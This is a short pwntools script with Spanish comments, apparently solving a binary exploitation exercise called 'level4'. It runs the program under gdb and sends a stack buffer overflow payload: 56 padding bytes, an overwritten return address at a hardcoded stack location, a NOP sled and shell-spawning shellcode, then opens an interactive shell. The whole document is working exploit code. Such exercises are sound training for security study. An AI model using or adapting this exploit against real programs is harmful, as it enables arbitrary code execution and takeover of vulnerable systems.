from pwn import *

# Crear una instacia de gdb con el programa.
io = gdb.debug('./level4')

# Pausar el debugger
pause()

#Enumeracion de tamaño y direccion
size = 56
eip = p64(0x00007fffffffddf0) 
shell = asm(shellcraft.sh())
 

# Crear el payload con caracteres a desbordar
payload = b'A' * size
payload += eip
payload += asm('nop')* 20
payload += shell



io.sendline(payload)

io.interactive()


